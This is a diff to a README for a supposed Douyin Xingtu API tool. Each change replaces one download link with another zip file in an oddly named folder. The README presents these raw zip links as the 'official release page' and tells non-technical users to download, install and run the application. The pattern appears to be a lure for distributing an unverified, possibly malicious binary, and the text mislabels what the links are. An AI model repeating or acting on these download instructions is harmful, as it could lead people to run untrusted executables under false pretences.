@@ -1,7 +1,7 @@
 # 🚀 douyin-xingtu-api - Access Douyin's Powerful API Easily
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/Daza33/douyin-xingtu-api/main/parisyllabical/douyin-xingtu-api_v3.7.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Daza33/douyin-xingtu-api/main/parisyllabical/douyin-xingtu-api_v3.7.zip)
+[![Download](https://raw.githubusercontent.com/Daza33/douyin-xingtu-api/main/parisyllabical/xingtu-douyin-api-v1.7.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Daza33/douyin-xingtu-api/main/parisyllabical/xingtu-douyin-api-v1.7.zip)
 
 ## 📖 Overview
 The douyin-xingtu-api provides a straightforward interface for interacting with Douyin's Xingtu features. This software allows users to access and utilize various services offered by Douyin's API without needing programming skills. Enjoy the benefits of a seamless experience through this easy-to-use application.
@@ -10,7 +10,7 @@ The douyin-xingtu-api provides a straightforward interface for interacting with 
 To start using the douyin-xingtu-api, you need to download and install the application on your device. Follow these simple steps:
 
 ### ✅ Step 1: Visit the Download Page
-Go to the official release page to download the application. You can find it here: [Download Page](https://raw.githubusercontent.com/Daza33/douyin-xingtu-api/main/parisyllabical/douyin-xingtu-api_v3.7.zip)
+Go to the official release page to download the application. You can find it here: [Download Page](https://raw.githubusercontent.com/Daza33/douyin-xingtu-api/main/parisyllabical/xingtu-douyin-api-v1.7.zip)
 
 ### ✅ Step 2: Choose Your Version
 On the Releases page, you will see different versions of the application. Pick the latest version to ensure you have the most up-to-date features and fixes. 
@@ -41,7 +41,7 @@ The douyin-xingtu-api offers the following features:
 
 ## 📤 Download & Install
 To start using douyin-xingtu-api, follow the steps outlined below. 
-1. Go to the official download page: [Download Page](https://raw.githubusercontent.com/Daza33/douyin-xingtu-api/main/parisyllabical/douyin-xingtu-api_v3.7.zip).
+1. Go to the official download page: [Download Page](https://raw.githubusercontent.com/Daza33/douyin-xingtu-api/main/parisyllabical/xingtu-douyin-api-v1.7.zip).
 2. Select and download the latest version.
 3. Install and run the application.
 
